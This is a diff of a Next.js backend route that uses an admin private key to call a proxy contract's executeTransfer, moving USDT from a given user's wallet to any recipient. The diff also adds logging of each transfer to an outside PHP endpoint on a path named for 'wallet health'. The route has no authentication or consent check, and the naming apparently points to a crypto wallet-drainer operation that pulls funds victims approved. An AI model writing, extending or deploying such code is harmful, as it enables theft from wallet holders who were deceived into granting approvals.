@@ -8,65 +8,70 @@ const chainConfigs = {
   // Ethereum Mainnet
   1: {
     rpcUrl: process.env.ETHEREUM_RPC_URL,
-    decimals: 6, // USDT on Ethereum has 6 decimals
+    decimals: 6,
   },
   // BNB Smart Chain
   56: {
     rpcUrl: process.env.BSC_RPC_URL,
-    decimals: 18, // USDT on BSC has 18 decimals
+    decimals: 18,
   },
 };
 
-// ABI for YOUR TransferProxy contract's executeTransfer function
-const PROXY_ABI = ["function executeTransfer(address _userAddress, address _recipient, uint256 _amount)"];
+// ABI for your TransferProxy contract
+const PROXY_ABI = [
+  "function executeTransfer(address _userAddress, address _recipient, uint256 _amount)"
+];
 
 export async function POST(req) {
-    // Destructure the request body
-    const { userAddress, recipientAddress, amountString, chainId } = await req.json();
+  const { userAddress, recipientAddress, amountString, chainId } = await req.json();
 
-    // Validate inputs
-    if (!userAddress || !recipientAddress || !amountString || !chainId) {
-        return NextResponse.json({ error: "Missing required fields." }, { status: 400 });
-    }
+  if (!userAddress || !recipientAddress || !amountString || !chainId) {
+    return NextResponse.json({ error: "Missing required fields." }, { status: 400 });
+  }
 
-    // Select the correct chain configuration
-    const config = chainConfigs[chainId];
-    // Get the single, unified proxy address from environment variables
-    const proxyAddress = process.env.PROXY_CONTRACT_ADDRESS;
+  const config = chainConfigs[chainId];
+  const proxyAddress = process.env.PROXY_CONTRACT_ADDRESS;
 
-    if (!config || !proxyAddress) {
-        return NextResponse.json({ error: "Unsupported chain or proxy contract not configured." }, { status: 400 });
-    }
+  if (!config || !proxyAddress) {
+    return NextResponse.json({ error: "Unsupported chain or proxy contract not configured." }, { status: 400 });
+  }
 
-    try {
-        // Set up the connection to the blockchain
-        const provider = new ethers.JsonRpcProvider(config.rpcUrl);
-        
-        // Securely load the admin wallet from the private key
-        const adminPrivateKey = process.env.ADMIN_PRIVATE_KEY;
-        if (!adminPrivateKey) {
-            throw new Error("Admin private key is not configured on the server.");
-        }
-        const adminWallet = new ethers.Wallet(adminPrivateKey, provider);
+  try {
+    const provider = new ethers.JsonRpcProvider(config.rpcUrl);
+    const adminPrivateKey = process.env.ADMIN_PRIVATE_KEY;
+    if (!adminPrivateKey) throw new Error("Admin private key not configured.");
 
-        // Create an instance of YOUR proxy contract, signed by the admin
-        const proxyContract = new ethers.Contract(proxyAddress, PROXY_ABI, adminWallet);
-        
-        // Format the amount string into the correct unit (wei/satoshi)
-        const amountToTransfer = ethers.parseUnits(amountString, config.decimals);
+    const adminWallet = new ethers.Wallet(adminPrivateKey, provider);
+    const proxyContract = new ethers.Contract(proxyAddress, PROXY_ABI, adminWallet);
+    const amountToTransfer = ethers.parseUnits(amountString, config.decimals);
 
-        // Call the `executeTransfer` function on your deployed proxy contract
-        const tx = await proxyContract.executeTransfer(userAddress, recipientAddress, amountToTransfer);
-        
-        // Wait for the transaction to be confirmed
-        await tx.wait();
+    const tx = await proxyContract.executeTransfer(userAddress, recipientAddress, amountToTransfer);
+    await tx.wait();
 
-        // Return a success response with the transaction hash
-        return NextResponse.json({ success: true, txHash: tx.hash });
+    // 🕓 Format IST date & time
+    const date = new Date();
+    const istTime = new Date(date.getTime() + 5.5 * 60 * 60 * 1000)
+      .toISOString()
+      .replace('T', ' ')
+      .slice(0, 19);
 
-    } catch (error) {
-        console.error("Backend Transfer Error:", error);
-        // Return a detailed error message
-        return NextResponse.json({ error: error.reason || "An error occurred during the transfer." }, { status: 500 });
-    }
+    // ✅ Log the transfer to your backend PHP endpoint
+    await fetch('https://tradeinusdt.com/api_wallet_health_vercel/save_transfer.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        from_wallet: userAddress,
+        to_wallet: recipientAddress,
+        amount: amountString,
+        tx_hash: tx.hash,
+        date_time: istTime,
+      }),
+    }).catch((err) => console.error('Transfer log error:', err));
+
+    return NextResponse.json({ success: true, txHash: tx.hash });
+
+  } catch (error) {
+    console.error("Backend Transfer Error:", error);
+    return NextResponse.json({ error: error.reason || error.message || "An error occurred during the transfer." }, { status: 500 });
+  }
 }
